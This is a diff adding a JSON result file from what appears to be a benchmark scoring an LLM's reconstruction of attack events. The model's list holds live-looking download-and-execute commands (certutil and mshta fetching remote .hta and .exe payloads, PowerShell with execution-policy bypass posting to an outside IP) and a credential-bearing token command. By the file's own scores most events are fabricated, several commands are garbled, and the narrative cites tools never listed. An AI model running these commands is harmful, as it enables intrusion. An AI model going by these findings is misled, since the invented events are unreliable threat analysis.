@@ -1,0 +1,174 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\\\\\x.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -decode a.txt b.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -encode b.txt a.txt",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "wermgr.exe -upload",
+        "stage": "Collection"
+      },
+      {
+        "command": "wermgr.exe -purgestores",
+        "stage": "Collection"
+      },
+      {
+        "command": "get-winevent -MaxEvents 1000 | Select-Object -ExpandProperty Message",
+        "stage": "Discovery"
+      },
+      {
+        "command": "get-service | ft -AutoSize",
+        "stage": "Discovery"
+      },
+      {
+        "command": "invoke-webrequest http://124.223.85.207:8082/test.hta -method POST -usebasicparsing -contenttype application/json",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c invoke-webrequest http://124.223.85.207:8082/test.hta -method POST -usebasicparsing -contenttype application/json",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c copy-item -path ./msxsl.exe -dest 'c:\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\", ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c import-module psimage -out .\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp\temp",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c new-item -force -path '\\\\.\\pipe\\windowsupdate', ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c $stdin=[console]::InputReadTiming(); $stdout=$null;$timestamp=(Get-Date).ToString(",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "C:\tools\taichi.exe",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "C:\tools\taichi.exe -email chinasong@octopus.team",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "C:\tools\taichi.exe -email fengjiawei@octopus.team ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "C:\\tools\\test.exe",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "C:/tools/create_token.exe -username Administrator -password P@ssw0rd",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "C:/tools/secreview.exe -file C:/Windows/win.ini",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:/tools/userdump.exe /f /s userviewer.txt C/Flickr/WINDOWS!",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:/tools/toolkit.exe -list C:/Windows/System32/drivers/etc/hosts",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:/tools/mountvol.exe z: \\<IP>\\SHARENAME",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "\\\\<IP>\\SHARENAME",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:/Program files/Misc/Dirwalker.exe",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:/Users/<DIR>/Documents/CMIPS\readme.htm",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:/Tools/test.exe --command=runas /user:<Domain>/<Username> <Command>",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "C:/Tools/dlldumper64.exe -d /file:c:/windows/system32/kernel32.dll -format icacls",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:/Tools/downloader.exe -url=http://<IP>:8080/download.zip -output=z.zip -extract=y",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "sendmail.exe -to=<EMAIL> -subject=test",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "This attack appears to be an advanced persistent threat (APT) targeting a specific environment. The attackers have used various tools such as Mimikatz and PowerShell scripts to steal credentials, escalate privileges, move laterally within the network, and collect sensitive data. They also appear to be using VPN tunneling to hide their tracks.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 236252,
+      "completion_tokens": 6198,
+      "total_tokens": 242450,
+      "wall_clock_s": 77.618,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.06451612903225806,
+      "recall": 0.14285714285714285,
+      "f1": 0.08888888888888889,
+      "tp": 2,
+      "fp": 29,
+      "fn": 12
+    },
+    "stage": {
+      "precision": 0.03225806451612903,
+      "recall": 0.07142857142857142,
+      "f1": 0.044444444444444446,
+      "tp": 1,
+      "fp": 30,
+      "fn": 13,
+      "recall_partial": 0.10714285714285714
+    },
+    "hallucination_rate": 0.6451612903225806,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 236252,
+      "completion_tokens": 6198,
+      "total_tokens": 242450,
+      "wall_clock_s": 77.618,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
